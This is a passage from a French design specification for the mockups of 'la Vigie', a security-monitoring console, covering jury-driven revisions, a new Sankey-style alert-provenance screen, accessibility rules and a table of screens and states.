5. **MV-06, registre à jour de main** : 54 règles, dont **« Surveillance réduite » au mode figé** (« Alerter · ne peut pas être changé : c'est elle qui prévient »).
   - Cas « DS22 » (et non D22) ; plus de « MV11 » à l'écran (cas en clair : « intégrité de la Vigie »).
   - **Pas de badge de gravité pour une règle à points** (« points », avec leur nombre).
   - Au téléphone, chaque carte d'interrupteur montre l'état et **un seul** « Arrêter… » ; durées et motif passent sur la page de confirmation.
   - Au bureau, sur une page de confirmation, un seul bouton plein, les autres durées en contour.
   - L'erreur d'un seuil n'étire pas les champs voisins.
6. **MV-07** : les commandes des blocs repliés ne débordent jamais (bloc `pre` qui défile seul, ou coupure permise), à 320 px et en espacement WCAG 1.4.12 ; un seul dessin de pastille d'état (phrase et cartes).
7. **MV-01** : la légende des gravités collée au tableau des alertes.
8. **MV-05** : « Décision #89 envoyée », puis « lue par le site à … » quand le site l'a lue. Le suivi de lecture est **à créer** et dit comme tel.
9. **MV-04** : liens de même nom distingués (« Fiche de l'adresse 192.0.2.77 »).
10. **MV-08** : pour couper tout de suite un compte de l'amorce, retirer son plafond `vigie.*` dans Zitadel (le droit effectif est le plus faible des deux).
11. **MV-09** :
    - « Se reconnecter » en contour sur « Connexion refusée » ;
    - « Clé d'accès exigée » : le contrôle de la revendication `amr` de Zitadel (clé d'accès, et non un code à usage unique) est **à vérifier en D3**, et dit comme tel.
12. **MV-10** : les états 8 et 10 (langues en allemand) ne débordent pas, `<details>` ouverts.
13. **Contrôles** :
    - une passe avec **tous les `<details>` ouverts**, à 320 et 412 px, dans `essais-vigie.mjs` et `consol-vigie.mjs` ;
    - les noms en double cherchés dans les cadres d'état aussi ;
    - l'espacement du texte à 412 px ;
    - les blocs « Mesures » réellement remplis (`commun.py`, repli de la ligne 292).

### 3.16 Finitions après le jury v3 (18 oct. 2026) : dernier tour, plus de jury de maquettes

Jury v3 : de 9 à 10 partout (jury 1 : MV-09 et MV-10 à 10, les autres à 9 ; jury 2 : huit à 10, MV-06 et MV-10 à 9). Finitions, sans nouveau tour :

1. **Commandes de MV-07** (`pre.vg-commande`) : coupure aux espaces seulement, jamais dans une option (`controle --accepter` ne doit jamais se lire « controle -- » puis « accepter »). Chaque mot est insécable ; le bloc défile seul s'il le faut.
2. **Essai des identifiants coupés** : exclure seulement `pre.vg-commande`, et y vérifier qu'aucune ligne ne se coupe dans un mot.
3. **Plafond Zitadel (MV-08)** : la console relit le plafond `vigie.*` **toutes les 5 minutes et avant toute action**, à créer en D3. Le texte de l'état 9 dit : « retirez son plafond `vigie.*` dans Zitadel : il perd l'accès dans les 5 minutes, et ne peut plus agir dès la requête suivante ».
4. **MV-01** : la légende des gravités devient la légende (`caption`) du tableau des alertes.
5. **MV-06** :
   - au bureau aussi, chaque carte d'interrupteur montre l'état et un seul « Arrêter… » ; durées et motif passent sur la page de confirmation ;
   - au téléphone, l'en-tête porte la ligne « Identité confirmée à 14 h 17, valable jusqu'à 14 h 22 ».
6. **Textes du code** (PR #124, à montrer comme faits) :
   - message de descente de mode : « règle « Cookie d'une session fermée rejoué depuis un autre appareil » passée de Bloquer à Observer » ;
   - apostrophe typographique partout dans les messages : « jusqu’à », « jusqu’au ».

   MV-06 et MV-10 reprennent ces textes mot pour mot, avec un exemple de descente de mode dans MV-10.
7. **Imitation** : MV-10 (encart, messages) et le lexique nomment **SPF, DKIM et DMARC** pour l'e-mail de secours, avec la clé d'accès et le favori.

### 3.17 Nouvel écran après validation : MV-11 « Flux et provenance des alertes » (18 oct. 2026)

Demandé par les photographes en validant MV-01 à MV-10 : une **carte des menaces**. Elle dit d'où viennent les alertes, directement ou par corrélation, en page d'accueil avec une petite image des flux, et dans un **diagramme des flux** complet, sur le modèle du bilan énergétique (diagramme de Sankey) : origines, sources qui consomment les événements, chemins, issues. Il doit être beau, pas comme le modèle.

**Adresse** : `/flux` (période `?periode=24h` par défaut, `7j`, `30j`), lien depuis la vignette de MV-01 et depuis la barre latérale (groupe Surveiller, entrée « Flux », après Vue d'ensemble).

**Le diagramme** (SVG rendu par le serveur, sans script) : quatre colonnes, de gauche à droite. L'épaisseur d'un flux est proportionnelle au nombre d'événements (échelle dite dans la légende).

1. **Origines** (qui) :
   - **visiteurs du site public** (adresses inconnues) ;
   - **réseaux listés** (Spamhaus, Feodo, Tor) ;
   - **comptes de l'admin** (sessions ouvertes) ;
   - **hors application** (base, serveur, sauvegarde) ;
   - **Zitadel** (connexions, droits) ;
   - **la Vigie elle-même** (contrôles, battements).
2. **Sources** (par où on l'a vu) : **site**, **bordure Cloudflare**, **Zitadel**, **contrôles de la Vigie**, avec le nombre d'événements de chacune.
3. **Chemins** :
   - **routine** (aucun point : battements, états, lectures ordinaires) ;
   - **points sur une entité** (score) ;
   - **corrélation** (règle Sigma sur plusieurs événements, quorum de deux sources) ;
   - **directement** (preuve à source unique).

   Corrélation et directement se distinguent **par la forme autant que par la couleur** : hachures obliques pour une corrélation, aplat pour une preuve directe, comme les hachures du modèle.
4. **Issues** :
   - **alertes** par gravité (Critique, Haute, Moyenne), avec leurs numéros au survol du titre SVG et en texte dans la table ;
   - **réponses automatiques** (gel, sessions fermées, blocage) ;
   - **notifications** (Signal, e-mail) ;
   - **sous le seuil** (points sans alerte) et **sans suite** (routine) : la « part perdue » du modèle, en gris, repliée vers le bas.

**Ce qui le rend lisible et beau** :
- bandes courbes et lisses, palette « Chambre noire » de l'admin, une teinte par source (jamais la seule information : chaque bande porte son libellé et son nombre aux deux bouts) ;
- les issues d'alerte en couleur de gravité ;
- le reste en gris, beaucoup de vide, typographie de la console ;
- le flux d'une alerte critique peut être mis en avant par un lien (`/flux?alerte=412`) : sa bande est surlignée et les autres s'estompent (rendu serveur).

**À côté du diagramme** :
- les **provenances les plus actives** : réseaux (/24, /48), opérateurs (ASN, bordure) et pays (Cloudflare), en nombres et en barres ;
- adresses tronquées pour un Lecteur ;
- **pas de carte du monde** : elle ne dit rien de plus que la liste, elle pèse lourd et elle exige un fond de carte extérieur (sobriété, CSP).

**Accessibilité** :
- le SVG a un titre et une description ;
- une **table équivalente** (origine → source → chemin → issue, nombres) suit le diagramme, dans un `<details>` ouvert au bureau ;
- les couleurs ne portent jamais seules l'information ;
- contraste forcé : les bandes gardent un contour ;
- mouvement réduit : aucune animation.

**Vignette en page d'accueil (MV-01)** :
- un petit diagramme simplifié en trois colonnes (sources → chemins → issues, 24 h), environ 360 × 140 px au bureau, pleine largeur au téléphone, sous la phrase d'état ;
- une phrase qui le résume : « Aujourd'hui, 319 événements : 3 alertes par corrélation, 3 directes, le reste sous le seuil ou sans suite » (nombres à tirer des données) ;
- un lien « Voir les flux ».

**Données** : celles du 17 oct., cohérentes avec MV-01 à MV-10.
- **Journal** : 319 événements (MV-03).
- **Alertes** :
  - #412 directe (site, hors application) ;
  - #413 directe (contrôles de la Vigie) ;
  - #414 directe (contrôles, surveillance réduite) ;
  - #409 par corrélation, score site et bordure ;
  - #405 par corrélation, score site et bordure ;
  - #407 directe (site, cookie rejoué).
- **Décisions** #84, #87 et #88 ; **messages Signal** de la journée (§ 3.5).

Répartir le reste par source selon MV-03, et le dire. `coherence-vigie.py` vérifie que les totaux de MV-11 et de la vignette s'accordent avec MV-01 et MV-03.

**À créer en D3** :
- les agrégats par flux, calculés une fois par minute à partir des événements, des signaux (`vigie_signal`) et des alertes, sans relire tout le journal (abaques) ;
- le rendu SVG serveur ;
- le surlignage d'une alerte.

### 3.18 Refonte de MV-11 après son jury (18 oct. 2026)

Jury ciblé : MV-11 à 5 (jury 1) et 8 (jury 2) ; MV-01 avec sa vignette à 6 et 9.

Le constat commun : **le dessin dit d'où viennent les événements, pas les alertes**. La masse du site et le gris occupent toute l'image, les alertes critiques ne sont que des filets d'un pixel, et « Haute 38 » se lit « 38 alertes hautes ». Décisions :

1. **Deux diagrammes, l'un sous l'autre.**
   - **« Les 6 alertes »** en tête, le cœur de l'écran : origine → source → chemin → alerte. **Une alerte vaut une bande d'épaisseur égale** (au moins 12 px), avec son numéro et sa pastille de gravité `.grav` (mot et jauge) au bout. C'est lui qui répond en 5 secondes à « d'où viennent les alertes ».
   - **« Les 319 événements »** dessous, pour le contexte, à l'échelle des événements.
2. **Chemins fidèles au code** :
   - **preuve directe** (règle ou détecteur à source unique) ;
   - **score d'une entité**, qui se divise en « au-dessus du seuil, deux sources → alerte » et « sous le seuil » ;
   - **corrélation** : seulement les vraies corrélations Sigma (MV-06), et aucune aujourd'hui, ce qui est dit ;
   - **sans point**, à la place de « routine », pour ne pas se confondre avec la routine masquée de MV-03.

   #409 et #405 sont des alertes **de score**.
3. **Issues** :
   - dans le diagramme des alertes, chaque alerte ;
   - dans celui des événements, les issues d'alerte en **pastilles de gravité** (« Haute · 2 alertes · 38 événements ») ;
   - une seule issue grise **« sans alerte 266 »**, nœud en contour seulement, bandes à 10–12 %.
4. **Ordre** : origines et sources rangées **par gravité de l'issue** (hors application et la Vigie elle-même en haut). Les fils des critiques deviennent courts et horizontaux.
5. **Libellés hors des bandes**, dans une gouttière à droite de chaque nœud, sans halo. L'essai les vérifie (point 12).
6. **Palette selon l'issue, pas selon la source** :
   - une bande qui mène à une alerte est en pleine teinte, avec un contour de 1 px à 3:1 au moins sur le fond ;
   - une bande qui ne mène à rien est à 25 % de sa teinte ;
   - en thème clair, les bandes d'alerte sont à 0,7 d'opacité au moins ;
   - les luminances voisines sont écartées : Zitadel plus clair (lilas), la Vigie plus sombre (sarcelle), avec un rapport de 1,5 au moins entre deux teintes voisines.
7. **Téléphone : pas de Sankey.** La phrase, puis une barre empilée libellée « 6 alertes par origine », puis la table avec ses intitulés (corriger la règle `[data-label]::before`, à laquelle manque `.vg-flux-t`). Un lien « Voir le diagramme » ouvre la version bureau. Le diagramme horizontal des alertes tient dès 1 024 px.
8. **Mise en avant d'une alerte** (`?alerte=412`) :
   - seule sa bande est allumée, d'un bout à l'autre, sans couvrir aucun libellé ;
   - le paramètre est un entier ; un numéro inconnu rend la page normale avec une erreur « alerte inconnue », sans renvoyer la saisie.

   Une période invalide (`?periode=`) a son erreur dessinée elle aussi.
9. **Provenances les plus actives** : le trafic des administrateurs (adresses de leurs connexions réussies, leurs opérateurs) en est exclu, avec une ligne « dont 9 événements des administrateurs, non comptés ». Les opérateurs (ASN) sont repris du lexique (§ 3.10 : `198.51.100.23` est sur AS64501), et le contrôle de cohérence vérifie les ASN.
10. **Vignette de MV-01** :
    - une **barre de provenance des 6 alertes**, libellée (« hors application 1 · site 3 · contrôles de la Vigie 2 »), avec les couleurs de gravité ;
    - placée **sous** le tableau des alertes, jamais au-dessus du pli de la première alerte ;
    - lien « Voir les flux ».

    Dans la barre latérale, **« Alertes » reste la première entrée de Surveiller**, puis « Flux ».
11. **Accessibilité** :
    - `aria-labelledby` vers le titre, `aria-describedby` vers la description ;
    - aucune animation ;
    - contraste forcé : contours et hachures.
12. **Essai `flux-lisible.mjs`** :
    - signale un texte posé sur une bande ou un nœud (intersection avec les `path` et `rect` de flux) ;
    - exige au moins un libellé par diagramme ;
    - force la version horizontale à 1 024 px.
13. **MV-02** : lien « Voir son flux » (`/flux?alerte=412`).
14. **Calcul en D3 (faisabilité)** :
    - comptes par minute pour origine, source, « sans point » et « points » ;
    - les événements des alertes sont repris à l'affichage par `alert_events` et retirés de « points » (le chemin d'un événement n'est connu qu'à l'ouverture de son alerte) ;
    - comptes par heure pour 7 et 30 jours ;
    - la vraie page ne porte qu'une version du diagramme.

### 3.19 Finitions de MV-11 après son second jury (18 oct. 2026) : dernier tour

Notes après la refonte : MV-11 à 8 (jury 1) et 9 (jury 2) ; MV-01 à 8 pour les deux. Finitions, sans nouveau jury :

1. **Flux continus.** Au bureau, les libellés des colonnes du milieu (sources, chemins) passent **au-dessus de la barre de leur nœud**, sur une ligne. Ils n'occupent plus de gouttière, et les bandes coulent d'un nœud au suivant sans trou. Au-delà de 1 280 px de large, la boîte de dessin passe à 1 120, sans vide à droite ; à 1 024 px, le texte reste à 13 px au moins.
2. **Barre de provenance de MV-01, par origine**, la même que la barre du téléphone de MV-11 : hors application 2 (#413, #412), visiteurs du site public 2 (#409, #405), comptes de l'admin 1 (#407), la Vigie elle-même 1 (#414). Le contrôle de cohérence compare les deux barres. (Le point 10 du § 3.18, qui la groupait par source, était une erreur.)
3. **Gravité jamais par la couleur seule dans les barres** (MV-01, MV-11 au téléphone) : chaque case porte la jauge `.grav` ou l'initiale (C, H, M), avec une légende à côté.
4. **Luminance** : la sarcelle de la Vigie et le bleu de la bordure, comme le site et Zitadel, s'écartent à 1,5 au moins **pour toutes les paires**, dans les deux thèmes. L'essai C9 compare toutes les paires (ou celles qui se touchent réellement dans le rendu).
5. **Légende** : « sans alerte » se lit à son nœud ; ses bandes sont à peine tracées, et la légende le dit.
6. **Téléphone** : dans la table des alertes, Origine → Sources → Chemin sur une ligne par alerte (carte plus courte).

## 4. Les maquettes et ce qu'elles montrent

Chaque maquette : bureau (1 440 × 900, thème Chambre noire) et téléphone (Pixel 7, clair), écran principal vivant, autres états dans `.mq-etats`, encart « Ce qui change » en dernier. Rôle montré : **Administrateur** (Sébastien) sauf indication ; l'état « Lecteur » (Camille) là où il change l'écran.

| Maquette | Écran | États à montrer |
|---|---|---|
| **MV-01** Vue d'ensemble | `/` : l'état en une phrase (« 2 alertes critiques et 2 hautes à traiter » **(consol. : « 1 alerte critique et 2 hautes » ; § 3.9)**), interrupteurs en tête (avec l'arrêt temporaire des blocages), alertes ouvertes triées par gravité puis date (§ 3.2 : gravité pastille + mot, titre, entité, sources, occurrences, dernière, mode, statut), décisions en cours (résumé, lien), santé en une ligne, chiffres sur 7 jours | aucune alerte ; Vigie en écart d'intégrité (bandeau) ; vue Lecteur (adresses tronquées, pas d'actions) |
| **MV-02** Fiche d'une alerte | `/alertes/412` : ce qui s'est passé en une phrase, gravité, mode, statut, réponse automatique déjà faite ; **D'où vient le signal** (§ 3.3) ; entité et score par source ; autres alertes de l'entité ; actions : Prendre en charge, Classer (Incident confirmé, Faux positif, Test + note), actions forcées (Fermer les sessions, Geler, Bloquer l'adresse avec portée et durée, Lever) | alerte #409 (score, quorum site + bordure) ; ré-authentification demandée avant une action forcée ; vue Lecteur ; alerte close |
| **MV-03** Événements | `/evenements` : filtres (type, gravité, source, compte, adresse, période), liste paginée (heure à la source et écart, type, gravité, source, adresse, compte, route), saisie suspecte échappée en chasse fixe tronquée, export CSV (Analyste) | liste vide pour un filtre ; vue Lecteur sans export |
| **MV-04** Entité | `/entites/ip/198.51.100.23` et `/entites/compte/zitadel-318204977` : score et part de chaque source, liens (comptes vus, sessions, réseaux), alertes, derniers événements, actions | compte ; adresse protégée (vue avec un administrateur : pas de blocage automatique) |
| **MV-05** Décisions | `/decisions` : décisions en cours (§ 3.4) avec Lever ; nouvelle décision (formulaire : type, cible, portée, durée, motif) ; garde-fous dits avant l'envoi (« jamais tout le monde », « votre propre adresse : confirmez ») ; Verrouiller l'admin (comptes et adresses autorisés, le vôtre ajouté d'office) | erreur de saisie (réseau trop large) ; confirmation sur sa propre adresse ; ré-authentification |
| **MV-06** Règles et réglages | `/reglages` : interrupteurs avec durée (« 1 h », « jusqu'à demain 8 h ») ; règles par cas (titre, gravité, mode, seuil) avec filtres ; seuils par entité ; adresses de confiance ; canaux (Signal, e-mail : état, « Envoyer un essai ») | règle passée en Arrêt (avertissement) ; vue Intervenant (lecture seule des réglages) |
| **MV-07** Santé et intégrité | `/sante` : chaîne (« Vérifier maintenant »), battements (site, Worker), Zitadel, bordure, contrôle des rôles, listes de menaces, retard d'analyse, place sur le disque, canaux | chaîne rompue (rupture listée, critique) ; Zitadel injoignable ; bordure muette |
| **MV-08** Droits | `/droits` : personnes (§ 3.6), plafond, attribution, effectif, changer l'attribution (Administrateur seulement), journal des changements | personne arrivée sans attribution (Lectrice) ; tentative de changer son propre rôle (refusée) |
| **MV-09** Accès | pages hors session : « Connexion refusée : aucun rôle dans la console », « Second facteur exigé », « Confirmez votre identité » (ré-authentification), « Session expirée » | les quatre, plus le jeton Access absent (403 sobre) |
| **MV-10** Dans l'admin du site | `/admin` (« Aujourd'hui ») : badge sur l'entrée « Sécurité » du menu, ligne « 2 alertes critiques et 1 haute ouvertes dans la Vigie » (urgent) **(consol. : « 1 alerte critique à traiter » ; § 3.12, § 3.13)**, bandeau rouge en haut de page pour une critique non prise en charge, lien qui ouvre la console dans un nouvel onglet ; **messages** Signal et e-mail (texte exact de `vigie/notifications.js`) | Vigie injoignable (bandeau daté « au dernier résumé, 14 h 10 », « Résumé de la Vigie indisponible depuis 14 h 11 » **(consol. : « indisponible depuis 14 h 10 », sans bandeau ; § 3.13, point 6)**) ; aucune alerte ; compte sans `securite.voir` (rien) |
| **MV-11** Flux et provenance des alertes **(MV-11 : § 3.17)** | `/flux` (`?periode=7j`, `30j`, `?alerte=412`) : la phrase du jour, « Les 6 alertes » (une bande égale par alerte) puis « Les 319 événements » **(refonte : § 3.18)**, leurs tables, ce que les alertes ont déclenché, les provenances sans les administrateurs ; barre de provenance par origine dans MV-01 **(§ 3.19)**, entrée « Flux » après « Alertes », « Voir son flux » dans MV-02 | 7 jours ; #412 mise en avant ; vue Lectrice ; journée calme ; téléphone (barre et tables, sans Sankey) ; paramètres refusés |

## 5. Ce qui existe dans le code et ce qui est à créer

- **Existe** (phases A à D1) : alertes, statuts et classements, modes, seuils, interrupteurs à durée, décisions et garde-fous, entités et scores par source, chronologie avec deux horodatages, contrôle des rôles, bordure, listes de menaces, canaux Signal et e-mail, résumé signé `GET /v1/resume`, ligne de commande équivalente à chaque écran.
- **À créer** (phase D3) : le serveur de la console (`vigie:4200`), la connexion Zitadel de la console et les deux clés des droits (DS29, DS30), l'export CSV, le noms des comptes repris du contrôle des rôles, la permission `securite.voir` et l'affichage dans l'admin, le rafraîchissement par script.
